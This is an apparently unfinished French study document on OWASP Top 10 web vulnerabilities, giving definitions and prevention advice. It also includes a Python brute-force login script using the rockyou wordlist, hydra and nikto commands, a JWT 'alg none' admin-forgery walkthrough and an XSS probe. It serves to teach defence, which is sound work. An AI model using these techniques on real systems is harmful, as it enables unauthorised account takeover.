# Injection SQL

### Définition

Des failles d'injection, telles que l'injection SQL, NoSQL, OS et LDAP, se produisent lorsque l'attaquant envoie des données à un interpréteur dans le cadre d'une commande ou d'une requête. 
l'injection de l'attaquant peux inciter à exécuter des commandes involontaires ou à accéder aux données sans autorisation appropriée.

- **Agents de menace / vecteurs d'attaque** : On peut supposer que presque toutes les sources de données peuvent être un vecteur d'injection comme des variables d'environnement, des paramètres, des services Web externes et internes et tous les types d'utilisateurs. Les failles d'injection se produisent lorsqu'un attaquant veut envoyer des données malveillante à un interpréteur SQL.

- **Faille de sécurité** : les failles d'injection sont très répandues, en particulier dans le code hérité. Les vulnérabilités d'injection se trouvent souvent dans les requêtes SQL, LDAP, XPath ou NoSQL, les commandes du système d'exploitation, les analyseurs XML, les en-têtes SMTP, les langages d'expression ou encore les requêtes ORM. Les scanners et les fuzzers peuvent aider les attaquants à trouver des défauts d'injection.
- **Impacts** : l'injection peut entraîner une perte de données, la corruption ou la divulgation à des parties non autorisées, la perte de responsabilité ou le refus d'accès. L'injection peut parfois conduire à une prise de contrôle complète de l'hôte. L'impact commercial dépend des besoins de l'application et des données.

### L'application est-elle vulnérable?

Une application est vulnérable aux attaques lorsque:

- Les données fournies par l'utilisateur ne sont pas validées ou filtrées par l'application.
- Les requêtes dynamiques ou les appels non paramétrés sans échappement contextuel sont utilisés directement dans l'interpréteur.
- Les données hostiles sont utilisées dans les paramètres de recherche de la cartographie relationnelle objet (ORM) pour extraire des enregistrements sensibles supplémentaires.
- Les données hostiles sont directement utilisées ou concaténées, de sorte que le SQL ou la commande contient à la fois la structure et les données hostiles dans des requêtes dynamiques, des commandes ou des procédures stockées.
- Certaines des injections les plus courantes sont SQL, NoSQL, commande OS, Object Relational Mapping (ORM), LDAP et Expression Language (EL) ou Object Graph Navigation Library (OGNL). Le concept est identique parmi tous les interprètes. L'examen du code source est la meilleure méthode pour détecter si les applications sont vulnérables aux injections, suivi de près par des tests automatisés approfondis de tous les paramètres, en-têtes, URL, cookies, JSON, SOAP et entrées de données XML. Les organisations peuvent inclure des outils de source statique et de test d'application dynamique dans le pipeline CI / CD pour identifier les failles d'injection nouvellement introduites avant le déploiement en production.

Exemple d'attaque SQL : On imagine un serveur communicants avec sa base SQL se fait attaquer.

- Etape 1 : Le hacker va lancer une requête SQL malveillante sur le serveur (Ex! un SiteWeb)
- Etape 2 : Le serveur va renvoyer la requête SQL malveillante sur la Base de donnée
- Etape 3 : La base de donnée va répondre à la requête SQL malveillante au serveur
- Etape 4 : Le serveur renvoie la réponse de la requêtes SQL malveillante à l'attaquant

Un exemple simple du fonctionnement d'une requête SQL malveillante

IMAGE EXEMPLESQL



Pour rentrer plus en profondeur je vais détailler 4 injections SQL

**Attaque 1 : Blind Based**

L'injection aveugle SQL est un type d'attaque qui pose des questions à la base de données et détermine la réponse en fonction de la réponse des applications, exemple, ici notre mot de passe est "password", j'envoie une requête serveur et je devine le mot de passe au fur à mesure.

Rappel : le "%" est essentiel, il permet de dire "Et tous le reste".

IMAGE ExempleBlind

Requête SQL

**Attaque 2 : Time Based**

Presque identique à la première, cependant, la réponse est déterminé en fonction du temps de réponse des applications, exemple : si la réponse se fait en 1 seconde c'est vrais, si elle ce fait en 5 seconde c'est faux. De ce fait on peut faire comme la première et déterminé le mot de passe en au fur à mesure suivant le temps de réponse.

IMAGE ExempleTime

**Attaque 3 : Error Based**

Cette méthode profite d'une faiblesse des systèmes de base de données permettant de détourner un message d'erreur généré par la base de données et préalablement volontairement provoquée par l'injection SQL pour lui faire retourner une valeur précise récupérée en base de données

**Attaque 4 : Union Based**

L'injection SQL basée sur l'Union est une technique d'injection qui exploite l'opérateur SQL UNION qui est utilisé pour combiner le résultat de deux ou plusieurs instructions SELECT en un seul résultat

IMAGE ExempleUnion

### Prévention

La prévention de l'injection nécessite de conserver les données distinctes des commandes et des requêtes.

- L'option préférée consiste à utiliser une API sûre, qui évite l'utilisation complète de l'interpréteur ou fournit une interface paramétrée, ou à migrer pour utiliser les outils de mappage relationnel objet. 
- Utilisez une validation d'entrée côté serveur positive ou «liste blanche». Ce n'est pas une défense complète car de nombreuses applications nécessitent des caractères spéciaux, tels que des zones de texte ou des API pour les applications mobiles.
- Pour toute requête dynamique résiduelle, filtrez les caractères spéciaux en utilisant la syntaxe spécifique pour chaque interpréteur. 
- Utilisez LIMIT et d'autres contrôles SQL dans les requêtes pour empêcher la divulgation massive des enregistrements en cas d'injection SQL.



# Broken Authentification

### Définition

Les fonctions d'application liées à l'authentification et à la gestion de session sont souvent implémentées de manière incorrecte, permettant aux attaquants de compromettre les mots de passe, les jetons de session, ou d'exploiter d'autres failles d'implémentation pour assuré l'identité des autres utilisateurs de manière temporaire ou permanente.

- **Agents de menace / vecteurs d'attaque** : les attaquants ont accès à des centaines de millions de combinaisons de nom d'utilisateur et de mot de passe valides pour le bourrage des informations d'identification, les listes de comptes administratifs par défaut on appelle sa un "dictionnaire". Les attaques de gestion de session sont bien réel, en particulier en ce qui concerne les jetons de session non expirés.
- **Faille de sécurité** : La prévalence de l'authentification rompue est répandue en raison de la conception et de la mise en œuvre de la plupart des contrôles d'identité et d'accès. La gestion de session est le fondement des contrôles d'authentification et d'accès et est présente dans toutes les applications avec état. Les attaquants peuvent détecter une authentification rompue à l'aide de moyens manuels et les exploiter à l'aide d'outils automatisés avec des listes de mots de passe et des attaques par dictionnaire.
- **Impacts** : les attaquants doivent avoir accès à seulement quelques comptes ou à un seul compte administrateur pour compromettre le système. Selon le domaine de l'application, cela peut permettre le blanchiment d'argent, la fraude à la sécurité sociale et le vol d'identité, ou divulguer des informations hautement sensibles protégées par la loi.

------

### Vulnérabilités

La confirmation de l'identité, de l'authentification et de la gestion de session de l'utilisateur sont essentielles pour se protéger contre les attaques liées à l'authentification. Il peut y avoir des faiblesses d'authentification si l'application:

- Autorise les attaques automatisées telles que le bourrage d'information d'identification , où l'attaquant possède une liste de noms d'utilisateur et de mots de passe valides.
- Autorise la force brute ou d'autres attaques automatisées.
- Autorise les mots de passe par défaut, faibles ou bien connus, tels que «Password1» ou «admin / admin».
- Utilise une récupération des informations d'identification faible ou inefficace et des processus de mot de passe oublié, tels que les «réponses basées sur les connaissances», qui ne peuvent pas être sécurisées.
- Utilise du texte brut, des mots de passe chiffrés ou faiblement hachés
- A une authentification multi facteur manquante ou inefficace.
- Expose les ID de session dans l'URL (par exemple, réécriture d'URL).
- Ne fait pas pivoter les ID de session après une connexion réussie.
- N'invalide pas correctement les ID de session. Les sessions utilisateur ou les jetons d'authentification (en particulier les jetons d'authentification unique (SSO)) ne sont pas correctement invalidés pendant la déconnexion ou une période d'inactivité.



**Attaque 1 : Attaque par Brute Force**

L'attaquant va alors utiliser pour la plus part du temps un outils, ou un script permettant l'utilisation d'un dictionnaire ou non et lancer plusieurs requêtes jusqu'à deviner le mot de passe

Sur un formulaire d'authentification, on peut utiliser comme outils "nikto" qui à une fonctionnalité de testé en bruteforce certain couple de mot de passe 

- nikto -h www.leformulaire.com

Pour le SSH on peut par exemple utiliser "hydra"

- hydra -l root -P "dico" -s 22 -f "IPduServeurSSH" ssh

On peut aussi utiliser des scripts personnalisés pour attaquer un formulaire login/password.

Prenons l'exemple d'un site web, on imagine que l'utilisateur que l'on souhaite pirater est "admin", on ne connait pas sont mot de passe. Ce script, permet l'utilisation d'un bibliothèque connus, ici, rockyou pour testé chaque couple admin/motdepasse, on utiliseras python ainsi que la librairie "request"

```
#!/usr/bin/python

import requests
import re

f = open("rockyou-75.txt","r").read().split('\n')
compteur = 0

for i in f:
	session = requests.Session()
	r = session.get('http://lesite.com')
	data = {
        	 "useralias" : "admin",
        	 "password" :  i,
        	 }
	url = "http://lesite.com"
	r = session.post(url,data=data)
	if "MauvaisMdp." in r.text:
		print str(compteur) + '\r'
		compteur+=1
	else:
		print "BonMdp: " + i
		exit()
```

IMAGE ExempleBruteForce

### Prévention

- Dans la mesure du possible, implémentez l'authentification multifacteur pour empêcher les attaques automatisées de bourrage d'informations d'identification, de force brute et de réutilisation des informations d'identification volées.
- Implémentez des vérifications de mots de passe faibles, telles que le test de mots de passe nouveaux ou modifiés par rapport à une liste des 10000 mots de passe les plus faible.
- Assurez-vous que les chemins d'enregistrement, de récupération des informations d'identification et d'API sont renforcés contre les attaques d'énumération de compte en utilisant les mêmes messages pour tous les résultats.
- Limitez ou retardez de plus en plus les tentatives de connexion infructueuses. Consignez toutes les pannes et alertez les administrateurs lorsque le bourrage d'informations d'identification, la force brute ou d'autres attaques sont détectés.
- Utilisez un gestionnaire de session intégré et sécurisé côté serveur qui génère un nouvel ID de session aléatoire avec une entropie élevée après la connexion. Les ID de session ne doivent pas figurer dans l'URL, être stockés de manière sécurisée et invalidés après déconnexion, inactivité et délais d'expiration.



# Sensitive Data Exposure

### Définition

De nombreuses applications Web et API ne protègent pas correctement les données sensibles. Les attaquants peuvent voler ou modifier ces données faiblement protégées pour commettre une fraude par carte de crédit, un vol d'identité ou d'autres délits, souvent ces données ne sont pas chiffrées ou chiffrées avec un algorithme de chiffrement faible.

- **Agents de menace / vecteurs d'attaque** : plutôt que d'attaquer directement la crypto, les attaquants volent des clés, exécutent des attaques de type intermédiaire ou volent des données en texte clair sur le serveur, pendant le transport, ou sur le client de l'utilisateur, par exemple un navigateur. Une attaque manuelle est généralement requise. Les bases de données de mots de passe précédemment récupérées peuvent être forcées par les unités de traitement graphique (GPU).
- **Faiblesses en matière de sécurité** : au cours des dernières années, il s'agit de l'attaque ayant le plus d'impact. Le défaut le plus courant est tout simplement de ne pas crypter les données sensibles. Lorsque la cryptographie est utilisée, la génération et la gestion de clés faibles et l'utilisation faible d'algorithmes, de protocoles et de chiffrement sont courantes, en particulier pour les techniques de stockage de hachage de mots de passe faibles. Pour les données en transit, les faiblesses côté serveur sont principalement faciles à détecter, mais difficiles pour les données au repos.
- **Impacts** : l'échec compromet fréquemment toutes les données qui auraient dû être protégées. En règle générale, ces informations comprennent des données personnelles sensibles (PII) telles que les dossiers de santé, les informations d'identification, les données personnelles et les cartes de crédit, qui nécessitent souvent une protection telle que définie par les lois ou règlements tels que le RGPD de l'UE ou les lois locales sur la confidentialité.

------

### Vulnérabilités

La première chose est de déterminer les besoins de protection des données en transit et au repos. Par exemple, les mots de passe, les numéros de carte de crédit, les dossiers médicaux, les informations personnelles et les secrets d'affaires nécessitent une protection supplémentaire, en particulier si ces données relèvent des lois sur la confidentialité, par exemple le Règlement général sur la protection des données (RGPD) de l'UE, ou des réglementations, par exemple la protection des données financières telles que PCI Norme de sécurité des données (PCI DSS). Pour toutes ces données:

- Les données sont-elles transmises en texte clair? Cela concerne des protocoles tels que HTTP, SMTP et FTP. Le trafic Internet externe est particulièrement dangereux. Vérifiez tout le trafic interne, par exemple entre les équilibreurs de charge, les serveurs Web ou les systèmes principaux.
- Des algorithmes cryptographiques anciens ou faibles sont-ils utilisés par défaut ou dans un code plus ancien?
- Des clés de chiffrement par défaut sont-elles utilisées, des clés de chiffrement faibles sont-elles générées ou réutilisées, ou la gestion ou la rotation des clés est-elle manquante?
- Le chiffrement n'est-il pas appliqué, par exemple, manque-t-il des directives de sécurité ou des en-têtes d'agent utilisateur (navigateur)?
- L'agent utilisateur (par exemple, application, client de messagerie) ne vérifie-t-il pas que le certificat de serveur reçu est valide?



Beaucoup d'attaque pourrais permettre d'avoir accès à des données non chiffré, les injection SQL par exemple  ou encore le MITM

**Attaque 1 : MITM**

L'attaque man-in-the-middle attack (MITM), est une attaque qui a pour but d'intercepter les communications entre deux parties, dans ce cas, si la données est non chiffré, l'attaquant pourras en clair voir les données sans problème.

Ici, l'utilisateur va ce connecter au FTP avec une communication non chiffré, il ne ce doute pas qu'un hacker ce trouve en MITM entre lui et sont serveur FTP, l'attaquant verras donc passer le login/motdepasse en clair.

IMAGE ExempleMITM

### Prévention

Procédez au minimum comme suit et consultez les références:

- Classer les données traitées, stockées ou transmises par une application. Identifiez les données sensibles en fonction des lois sur la confidentialité, des exigences réglementaires ou des besoins de l'entreprise.
- Appliquer des contrôles selon la classification.
- Ne stockez pas inutilement des données sensibles. Jetez-le dès que possible.
- Assurez-vous de chiffrer toutes les données sensibles.
- Assurez-vous que des algorithmes, protocoles et clés standard à jour et solides sont en place; utiliser une bonne gestion des clés.
- chiffrez toutes les données en transit avec des protocoles sécurisés tels que TLS avec des chiffrements PFS (Perfect Forward Secret), une hiérarchisation des chiffrements par le serveur et des paramètres sécurisés.
- Désactivez la mise en cache pour les réponses contenant des données sensibles.
- Stockez les mots de passe à l'aide de fonctions de hachage adaptatives et salées.
- Vérifiez indépendamment l'efficacité de la configuration et des paramètres.



# XML External Entities (XXE)

### Définition

Une attaque d'entité externe XML est un type d'attaque contre une application qui analyse une entrée XML. Cette attaque se produit lorsque l'entrée XML contenant une référence à une entité externe est traitée par un analyseur XML faiblement configuré. Cette attaque peut entraîner la divulgation de données confidentielles, un déni de service, la falsification de requêtes côté serveur, la numérisation de port du point de vue de la machine sur laquelle se trouve l'analyseur et d'autres répercussions sur le système.

- **Agents de menace / vecteurs d'attaque** : les attaquants peuvent exploiter des processeurs XML vulnérables s'ils peuvent télécharger du XML ou inclure du contenu hostile dans un document XML, en exploitant du code vulnérable, des dépendances ou des intégrations.
- **Faille de sécurité** : par défaut, de nombreux processeurs XML plus anciens autorisent la spécification d'une entité externe, un URI qui est déréférencé et évalué pendant le traitement XML. Les outils DAST peuvent découvrir ce problème en inspectant les dépendances et la configuration. Les outils DAST nécessitent des étapes manuelles supplémentaires pour détecter et exploiter ce problème. Les testeurs manuels doivent être formés à la façon de tester XXE, car il n'était pas couramment testé en 2017.
- **Impacts** : ces failles peuvent être utilisées pour extraire des données, exécuter une requête à distance à partir du serveur, analyser les systèmes internes, effectuer une attaque par déni de service, ainsi que pour exécuter d'autres attaques. L'impact commercial dépend des besoins de protection de toutes les applications et données concernées.

------

### Vulnérabilités

Les applications et en particulier les services Web basés sur XML ou les intégrations en aval peuvent être vulnérables aux attaques si:

- L'application accepte XML directement ou les téléchargements XML, en particulier à partir de sources non fiables, ou insère des données non fiables dans des documents XML, qui sont ensuite analysées par un processeur XML.

- Si l'application utilise SAML pour le traitement des identités dans le cadre de la sécurité fédérée ou de l'authentification unique (SSO). SAML utilise XML pour les assertions d'identité et peut être vulnérable.

- Si l'application utilise SOAP avant la version 1.2, elle est susceptible de subir des attaques XXE si des entités XML sont transmises au framework SOAP. Être vulnérable aux attaques XXE signifie probablement que l'application est vulnérable aux attaques par déni de service, y compris l'attaque Billion Laughs

  

**Attaque 2 : XXE**

Une attaque d' entité externe XML est un type d'attaque contre une application qui analyse une entrée XML. Cette attaque se produit lorsque l' entrée XML contenant une référence à une entité externe est traitée par un analyseur XML faiblement configuré . 

Cette attaque peut entraîner la divulgation de données confidentielles, un déni de service, la falsification de requêtes côté serveur, la numérisation de port du point de vue de la machine sur laquelle se trouve l'analyseur et d'autres impacts sur le système.

IMAGE ExempleXEE

### Prévention

La formation des développeurs est essentielle pour identifier et atténuer XXE. De plus, la prévention de XXE nécessite:

- Dans la mesure du possible, utilisez des formats de données moins complexes tels que JSON et évitez la sérialisation des données sensibles.
- Corrigez ou mettez à niveau tous les processeurs et bibliothèques XML utilisés par l'application ou sur le système d'exploitation sous-jacent. Utilisez des vérificateurs de dépendances.
- Désactivez l'entité externe XML et le traitement DTD dans tous les analyseurs XML de l'application.
- Mettez en œuvre une validation, un filtrage ou un filtrage des entrées côté serveur positif («liste blanche») pour empêcher les données hostiles dans les documents XML, les en-têtes ou les nœuds.
- Vérifiez que la fonctionnalité de téléchargement de fichiers XML ou XSL valide le XML entrant à l'aide de la validation XSD ou similaire.

Si ces contrôles ne sont pas possibles, envisagez d'utiliser des correctifs virtuels, des passerelles de sécurité API ou des pare-feu d'applications Web (WAF) pour détecter, surveiller et bloquer les attaques XXE.



# Broken Access Control

### Définition

Les restrictions sur ce que les utilisateurs authentifiés sont autorisés à faire ne sont souvent pas correctement appliquées. Les attaquants peuvent exploiter ces failles pour accéder à des fonctionnalités et/ou des données non autorisées, comme accéder aux comptes d'autres utilisateurs, afficher des fichiers sensibles, modifier les données d'autres utilisateurs, changer les droits d'accès, etc...

- **Agents de menace / vecteurs d'attaque** : l'exploitation du contrôle d'accès est une compétence essentielle des attaquants. Les outils SAST et DAST peuvent détecter l'absence de contrôle d'accès mais ne peuvent pas vérifier s'il est fonctionnel lorsqu'il est présent. Le contrôle d'accès est détectable à l'aide de moyens manuels, ou éventuellement grâce à l'automatisation pour l'absence de contrôles d'accès dans certains cadres.
- **Faiblesse de sécurité** : les faiblesses du contrôle d'accès sont fréquentes en raison du manque de détection automatisée et du manque de tests fonctionnels efficaces par les développeurs d'applications. La détection du contrôle d'accès ne se prête généralement pas à des tests statiques ou dynamiques automatisés. Les tests manuels sont le meilleur moyen de détecter les contrôles d'accès manquants ou inefficaces, y compris la méthode HTTP (GET vs PUT, etc.), le contrôleur, les références d'objet directes, etc.
- **Impacts** : L'impact technique concerne les attaquants agissant en tant qu'utilisateurs ou administrateurs, ou les utilisateurs utilisant des fonctions privilégiées, ou créant, accédant, mettant à jour ou supprimant chaque enregistrement. L'impact commercial dépend des besoins de protection de l'application et des données.

------

### Vulnérabilités

Le contrôle d'accès applique une stratégie telle que les utilisateurs ne peuvent pas agir en dehors des autorisations prévues. Les échecs conduisent généralement à la divulgation non autorisée d'informations, à la modification ou à la destruction de toutes les données, ou à l'exécution d'une fonction commerciale en dehors des limites de l'utilisateur. Les vulnérabilités courantes de contrôle d'accès incluent:

- Contourner les contrôles de contrôle d'accès en modifiant l'URL, l'état de l'application interne ou la page HTML, ou simplement en utilisant un outil d'attaque API personnalisé.
- Permettre à la clé primaire d'être changée en enregistrement d'utilisateurs d'un autre, permettant d'afficher ou de modifier le compte de quelqu'un d'autre.
- Élévation de privilège. Agir en tant qu'utilisateur sans être connecté, ou agir en tant qu'administrateur lorsque vous êtes connecté en tant qu'utilisateur.
- Manipulation de métadonnées, comme la relecture ou la falsification d'un jeton de contrôle d'accès JSON Web Token (JWT) ou d'un cookie ou d'un champ masqué manipulé pour élever les privilèges, ou abus de l'invalidation JWT
- Une mauvaise configuration de CORS permet un accès API non autorisé.
- Forcer la navigation vers des pages authentifiées en tant qu'utilisateur non authentifié ou vers des pages privilégiées en tant qu'utilisateur standard. Accès à l'API avec des contrôles d'accès manquants pour POST, PUT et DELETE.



**Attaque 1 : JSON Web Token (JWT)**

JSON Web token permet l'échange sécurisé de jetons entre plusieurs parties cependant, on peut usurper un token ou encore trompé la vérification de la signature ou encore déchiffré des "secrets" facilement avec des dictionnaires.

Un JSON Web token est construis en 3 parties.

- Il est composé de 3 parties : le header, le payload et la signature.
- Il sont séparés par des points dans la chaine de caractères et les informations sont encodées en base64.

On peut voir les tokens si l'on inspecte la page dans la partie "network", un exemple d'un TOKEN.

*eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk*

Si l'on décode chaque partie cela donne :

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 = {"typ":"JWT","alg":"HS256"}

eyJ1c2VybmFtZSI6Imd1ZXN0In0 = {"username":"guest"}

**Cette partie est la signature.**

OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk = :{z WF'ڳz>w

Seulement voilà, on peut tromper la vérification via signature en indiquant dans le header que l’on utilise pas d’algorithme de signature.

On change de {"username":"guest"} à {"username":"admin"} pour être en admin, on supprime l'algorithme pour la signature: {"typ":"JWT","alg":"none"} et on retire la signature, on renvoie notre payload et PAF, nous sommes admin.

IMAGE ExempleTOKEN

### Prévention

Le contrôle d'accès n'est efficace que s'il est appliqué dans du code côté serveur approuvé ou une API sans serveur, où l'attaquant ne peut pas modifier la vérification du contrôle d'accès ou les métadonnées.

- À l'exception des ressources publiques, refusez par défaut.
- Implémentez une fois les mécanismes de contrôle d'accès et réutilisez-les tout au long de l'application, notamment en minimisant l'utilisation de CORS.
- Les contrôles d'accès aux modèles doivent imposer la propriété des enregistrements, plutôt que d'accepter que l'utilisateur puisse créer, lire, mettre à jour ou supprimer n'importe quel enregistrement.
- Désactivez la liste des répertoires du serveur Web et assurez-vous que les métadonnées des fichiers (par exemple .git) et les fichiers de sauvegarde ne sont pas présents dans les racines Web.
- Enregistrer les échecs de contrôle d'accès, alerter les administrateurs le cas échéant (par exemple, échecs répétés).
- Limitez l'accès à l'API et au contrôleur pour minimiser les dommages causés par les outils d'attaque automatisés.
- Les jetons JWT doivent être invalidés sur le serveur après la déconnexion.



# Security Misconfiguration

### Définition

Une mauvaise configuration de la sécurité est le problème le plus courant. Cela est généralement le résultat de configurations par défaut non sécurisées, de configurations incomplètes, d'en-têtes HTTP mal configurés et de messages d'erreur détaillés contenant des informations sensibles. Non seulement tous les systèmes d'exploitation, bibliothèques et applications doivent être configurés en toute sécurité, mais ils doivent être corrigés / mis à niveau en temps opportun.

- **Agents de menace / vecteurs d'attaque** : les attaquants tentent souvent d'exploiter des failles non corrigées ou d'accéder à des comptes par défaut, à des pages inutilisées, à des fichiers et répertoires non protégés, etc. pour obtenir un accès non autorisé ou une connaissance du système.
- **Faiblesse de sécurité** : une mauvaise configuration de la sécurité peut se produire à n'importe quel niveau d'une pile d'applications, y compris les services réseau, la plate-forme, le serveur Web, le serveur d'applications, la base de données, les cadres, le code personnalisé et les machines virtuelles, conteneurs ou stockage préinstallés. Les scanners automatisés sont utiles pour détecter les erreurs de configuration, l'utilisation de comptes ou de configurations par défaut, les services inutiles, les options héritées, etc.
- **Impacts** : ces failles donnent fréquemment aux attaquants un accès non autorisé à certaines données ou fonctionnalités du système. Parfois, ces défauts entraînent un compromis complet du système. L'impact commercial dépend des besoins de protection de l'application et des données.

------

### Vulnérabilités

L'application peut être vulnérable si l'application est:

- Renforcement de la sécurité appropriée manquant sur n'importe quelle partie de la pile d'applications ou autorisations mal configurées sur les services cloud.
- Les fonctionnalités inutiles sont activées ou installées (par exemple, ports, services, pages, comptes ou privilèges inutiles).
- Les comptes par défaut et leurs mots de passe sont toujours activés et inchangés.
- La gestion des erreurs révèle aux utilisateurs des traces de pile ou d'autres messages d'erreur trop informatifs.
- Pour les systèmes mis à niveau, les dernières fonctionnalités de sécurité sont désactivées ou ne sont pas configurées en toute sécurité.
- Les paramètres de sécurité dans les serveurs d'applications, les cadres d'application (par exemple Struts, Spring, ASP.NET), les bibliothèques, les bases de données, etc. ne sont pas définis sur des valeurs sécurisées.
- Le serveur n'envoie pas d'en-têtes ou de directives de sécurité ou ils ne sont pas définis sur des valeurs sécurisées

**Attaque 1 : Insecure Code Management**

Certain site web laisse parfois des accès a des informations sensible, un exemple avec le .git

On remarque sur un site web que l'administrateur à laisser u

### Prévention

Des processus d'installation sécurisés doivent être mis en œuvre, notamment:

- Un processus de durcissement reproductible qui permet de déployer rapidement et facilement un autre environnement correctement verrouillé. Les environnements de développement, d'assurance qualité et de production doivent tous être configurés de manière identique, avec des informations d'identification différentes utilisées dans chaque environnement. Ce processus doit être automatisé afin de minimiser l'effort requis pour configurer un nouvel environnement sécurisé.
- Une plate-forme minimale sans fonctionnalités, composants, documentation et exemples inutiles. Supprimez ou n'installez pas les fonctionnalités et les cadres inutilisés.
- Une tâche pour examiner et mettre à jour les configurations appropriées à toutes les notes de sécurité, mises à jour et correctifs dans le cadre du processus de gestion des correctifs.
- Une architecture d'application segmentée qui fournit une séparation efficace et sécurisée entre les composants ou les locataires, avec segmentation, conteneurisation ou groupes de sécurité cloud (ACL).
- Envoi de directives de sécurité aux clients
- Un processus automatisé pour vérifier l'efficacité des configurations et des paramètres dans tous les environnements.



# Cross-Site Scripting (XSS)

### Définition

Des failles XSS inclut des données non autorisés dans une page Web, ou met à jour une page Web existante avec des données fournies par l'attaquant. XSS permet en autres aux attaquants d'exécuter des scripts dans le navigateur de la victime qui peuvent pirater des sessions utilisateur, défigurer des sites Web ou rediriger l'utilisateur vers des sites malveillants.

- **Agents de menace / vecteurs d'attaque** : des outils automatisés peuvent détecter et exploiter les trois formes de XSS, et il existe des cadres d'exploitation librement disponibles.
- **Faille de sécurité** : XSS est le deuxième problème le plus répandu dans le Top 10 OWASP, et se trouve dans environ les deux tiers de toutes les applications. Les outils automatisés peuvent détecter automatiquement certains problèmes XSS, en particulier dans les technologies matures telles que PHP, J2EE / JSP et ASP.NET.
- **Impacts** : l'impact de XSS est modéré pour les XSS réfléchis et DOM, et sévère pour les XSS stockés, avec une exécution de code à distance sur le navigateur de la victime, comme le vol d'informations d'identification, des sessions ou la livraison de logiciels malveillants à la victime.

------

### Vulnérabilités

Il existe trois formes de XSS, ciblant généralement les navigateurs des utilisateurs:

- **Reflected XSS** : l'application ou l'API inclut une entrée utilisateur non validée et non échappée dans le cadre de la sortie HTML. Une attaque réussie peut permettre à l'attaquant d'exécuter du code HTML et JavaScript arbitraire dans le navigateur de la victime. En règle générale, l'utilisateur devra interagir avec un lien malveillant qui pointe vers une page contrôlée par un attaquant, comme des sites Web malveillants, des publicités ou similaires.
- **XSS stocké** : l'application ou l'API stocke les entrées utilisateur non analysées qui sont affichées ultérieurement par un autre utilisateur ou un administrateur. Le XSS stocké est souvent considéré comme un risque élevé ou critique.
- **DOM XSS** : les frameworks JavaScript, les applications d'une seule page et les API qui incluent dynamiquement des données contrôlables par l'attaquant dans une page sont vulnérables à DOM XSS. Idéalement, l'application n'enverrait pas de données contrôlables par l'attaquant à des API JavaScript non sécurisées.

**Attaque 1 : XSS**

Le cross-site scripting (XSS ) permet d'injecter du contenu dans une page web, provoquant ainsi des actions sur malveillante sur les utilisateurs visitant la page, vol de cookie, redirection vers un site malveillant, défaçage.

Pour tester si une faille XSS existe, la manière la plus simple est d’injecter un code javascript. Le test le plus élémentaire à réaliser est de l’injection soit dans une URL, soit dans un formulaire de contact, dans un livre d’or, etc ..

Cette commande permet de voir si le site est faillible à du XSS elle est à retenir 

- <script>alert(1)</script>

Si lorsque j’envoie mon script Javascript, une pop-up apparait. la faille est bien présente dans le formulaire.

Ensuite je dois construire ma XSS pour récupéré un cookie ou faire une redirection vers un site malveillant.

IMAGE ExempleXSS

### Prévention

La prévention de XSS nécessite la séparation des données non fiables du contenu du navigateur actif. Cela peut être réalisé par:

- Utilisation de frameworks qui échappent automatiquement à XSS par conception, tels que le dernier Ruby on Rails, React JS. Découvrez les limites de la protection XSS de chaque framework et gérez correctement les cas d'utilisation qui ne sont pas couverts.
- L'échappement de données de requête HTTP non fiables en fonction du contexte dans la sortie HTML (corps, attribut, JavaScript, CSS ou URL) résoudra les vulnérabilités XSS reflétées et stockées.
- L'application d'un encodage contextuel lors de la modification du document du navigateur côté client agit contre DOM XSS. Lorsque cela ne peut être évité, des techniques d'échappement contextuelles similaires peuvent être appliquées aux API du navigateur.
- Utiliser la fonction`htmlspecialchars()` . Cette fonction permet de filtrer les symboles du type <, & ou encore ", en les remplaçant par leur équivalent en HTML.



# Insecure Deserialization

### Définition

Une désérialisation non sécurisée conduit souvent à l'exécution de code à distance. Même si les failles de désérialisation n'entraînent pas l'exécution de code à distance, elles peuvent être utilisées pour effectuer des attaques, notamment des attaques de relecture, des attaques par injection et des attaques par escalade de privilèges

- **Agents de menace / vecteurs d'attaque** : l'exploitation de la désérialisation est quelque peu difficile, car les exploits standard fonctionnent rarement sans modifications ou ajustements du code d'exploitation sous-jacent.
- **Faille de sécurité** : ce problème est inclus dans le Top 10 sur la base d'une enquête de l'industrie et non sur des données quantifiables. Certains outils peuvent détecter des failles de désérialisation, mais une assistance humaine est souvent nécessaire pour valider le problème. On s'attend à ce que les données de prévalence des défauts de désérialisation augmentent à mesure que des outils sont développés pour aider à les identifier et à y remédier.
- **Impacts** : L'impact des défauts de désérialisation ne peut pas être surestimé. Ces failles peuvent conduire à des attaques d'exécution de code à distance, l'une des attaques les plus graves possibles. L'impact commercial dépend des besoins de protection de l'application et des données.

------

### Vulnérabilités

Les applications et les API seront vulnérables si elles désérialisent des objets hostiles ou falsifiés fournis par un attaquant. Cela peut entraîner deux principaux types d'attaques:

- Attaques liées aux objets et à la structure de données où l'attaquant modifie la logique de l'application ou réalise l'exécution de code à distance arbitraire s'il existe des classes disponibles pour l'application qui peuvent changer de comportement pendant ou après la désérialisation.
- Attaques de falsification de données typiques telles que les attaques liées au contrôle d'accès où les structures de données existantes sont utilisées mais le contenu est modifié.

La sérialisation peut être utilisée dans des applications pour:

- Communication à distance et inter-processus (RPC / IPC)

- Protocoles filaires, services Web, courtiers de messages

- Mise en cache / persistance

- Bases de données, serveurs de cache, systèmes de fichiers

- Cookies HTTP, paramètres de formulaire HTML, jetons d'authentification API

  ### Prévention
  
  Le seul modèle architectural sûr est de ne pas accepter les objets sérialisés provenant de sources non fiables ou d'utiliser des supports de sérialisation qui n'autorisent que les types de données primitifs. Si cela n'est pas possible, envisagez l'une des options suivantes:
  
  - Implémentation de contrôles d'intégrité tels que des signatures numériques sur tous les objets sérialisés pour empêcher la création d'objets hostiles ou la falsification de données.
  - Application de contraintes de type strictes pendant la désérialisation avant la création de l'objet, car le code attend généralement un ensemble définissable de classes. Les contournements de cette technique ont été démontrés, il est donc déconseillé de s'en remettre uniquement à cette technique.
  - Isoler et exécuter du code qui désérialise dans les environnements à faibles privilèges lorsque cela est possible.
  - Consigner les exceptions et les échecs de désérialisation, par exemple lorsque le type entrant n'est pas le type attendu ou que la désérialisation lève des exceptions.
  - Restreindre ou surveiller la connectivité réseau entrante et sortante à partir de conteneurs ou de serveurs qui se désérialisent.
  - Surveillance de la désérialisation, alerte si un utilisateur se désérialise en permanence.
  
  

# Using Components with Known Vulnerabilities

### Définition

